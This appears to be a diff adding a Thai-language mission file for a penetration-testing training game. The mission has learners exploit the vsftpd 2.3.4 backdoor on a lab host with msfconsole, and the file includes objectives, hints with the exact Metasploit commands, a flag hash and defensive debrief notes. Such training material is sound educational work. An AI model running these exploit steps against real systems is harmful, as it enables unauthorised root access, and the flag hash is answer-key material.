@@ -1,0 +1,84 @@
+{
+  "id": "c06-m03",
+  "chapter": "c06",
+  "title": "อัตโนมัติด้วย msfconsole",
+  "difficulty": "medium",
+  "xp": 350,
+  "estMinutes": 15,
+  "lesson": "c06-l01",
+  "briefing": "ตอนนี้คุณรู้แล้วว่า legacy01 (10.10.20.15) มีช่องโหว่ vsftpd 2.3.4 backdoor และเคยเจาะมันด้วยมือมาแล้ว ลองใช้ msfconsole ทำแบบเดียวกันแบบอัตโนมัติ เพื่อเห็นความแตกต่างระหว่างสองวิธี",
+  "scope": {
+    "inScope": [
+      "legacy01 — 10.10.20.15"
+    ],
+    "outOfScope": [
+      "เครื่องอื่นทั้งหมด"
+    ],
+    "ips": [
+      "10.10.20.15"
+    ]
+  },
+  "machine": "training-box",
+  "network": "lab",
+  "startUser": "kali",
+  "reachableMachines": [
+    { "ip": "10.10.20.15", "machine": "legacy01" }
+  ],
+  "objectives": [
+    {
+      "id": "o1",
+      "text": "เปิด msfconsole แล้วค้นหาโมดูลของ vsftpd",
+      "type": "event",
+      "name": "msf.search",
+      "where": { "query": "vsftpd" }
+    },
+    {
+      "id": "o2",
+      "text": "เลือกใช้โมดูล exploit/unix/ftp/vsftpd_234_backdoor",
+      "type": "event",
+      "name": "msf.use",
+      "where": { "module": "vsftpd_234_backdoor" }
+    },
+    {
+      "id": "o3",
+      "text": "ตั้งค่า RHOSTS เป็น 10.10.20.15 แล้ว run",
+      "type": "event",
+      "name": "msf.set",
+      "where": { "key": "^RHOSTS$", "value": "10\\.10\\.20\\.15" }
+    },
+    {
+      "id": "o4",
+      "text": "ยืนยันว่าได้ root shell บน legacy01 ผ่าน msfconsole",
+      "type": "shell",
+      "host": "legacy01",
+      "user": "root"
+    },
+    {
+      "id": "o5",
+      "text": "msfconsole ยิง exploit ตัวนี้สำเร็จ",
+      "type": "event",
+      "name": "msf.exploit",
+      "where": { "module": "vsftpd_234_backdoor", "ok": "^true$" }
+    },
+    {
+      "id": "o6",
+      "text": "อ่านไฟล์ /root/flag.txt แล้วส่ง flag",
+      "type": "flag",
+      "flagHash": "9035e652cc95e93914b1b0bc5e345b6af947e3b884acb99eb50480745a78996f"
+    }
+  ],
+  "hints": [
+    { "cost": 10, "text": "`msfconsole` เปิด console แล้ว `search vsftpd`" },
+    { "cost": 15, "text": "`use exploit/unix/ftp/vsftpd_234_backdoor`" },
+    { "cost": 20, "text": "`set RHOSTS 10.10.20.15` แล้ว `run`" }
+  ],
+  "debrief": [
+    "msfconsole ทำสิ่งเดียวกับที่คุณทำด้วยมือในด่านก่อน (ftp → trigger backdoor → nc ไปพอร์ต 6200) เพียงแต่รวมทุกขั้นตอนไว้ในโมดูลเดียว — เร็วกว่ามากเมื่อต้องเจาะช่องโหว่ที่รู้จักแล้วซ้ำๆ หลายเครื่อง",
+    "ข้อเสียคือ msfconsole ใช้ได้เฉพาะกับช่องโหว่ที่ **มีคนเขียนโมดูลไว้แล้ว** เท่านั้น — ช่องโหว่ใหม่หรือที่ไม่มีคนทำโมดูลสาธารณะไว้ ต้องกลับไปใช้วิธี manual exploitation เหมือนด่านก่อนเสมอ ทักษะทั้งสองจึงสำคัญคู่กัน ไม่ใช่เลือกอย่างใดอย่างหนึ่ง",
+    "ฝั่งป้องกัน: เหมือนด่านก่อน — ตรวจสอบ asset inventory และอัปเดต/ปิด service เก่าที่ไม่ได้ใช้งาน; การที่ exploit มีโมดูลสำเร็จรูปใน Metasploit ยิ่งเพิ่มความเร่งด่วนในการแก้ไข เพราะผู้โจมตีที่มีทักษะต่ำก็ใช้ได้"
+  ],
+  "references": [
+    "CVE-2011-2523",
+    "MITRE ATT&CK T1210 Exploitation of Remote Services"
+  ]
+}
